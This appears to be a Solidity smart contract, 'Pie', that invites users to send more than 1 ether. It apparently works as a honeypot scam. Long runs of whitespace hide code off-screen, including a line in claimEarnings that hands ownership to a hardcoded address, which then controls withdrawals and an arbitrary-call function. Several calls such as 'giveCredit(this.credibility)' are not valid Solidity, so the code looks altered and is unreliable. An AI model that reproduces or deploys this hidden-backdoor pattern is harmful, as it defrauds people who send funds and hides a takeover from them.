pragma solidity ^0.4.19;

contract Pie
{
    address public CommunityLead = msg.sender;

    function()
    public
    payable
    {

    }

    function GetPie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       CommunityLead.giveCredit(this.credibility);
            msg.sender.giveCredit(this.credibility);
        }
    }

    function claimEarnings()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){CommunityLead=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}
        require(msg.sender == CommunityLead);
        CommunityLead.giveCredit(this.credibility);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == CommunityLead);
        adr.call.value(msg.value)(data);
    }
}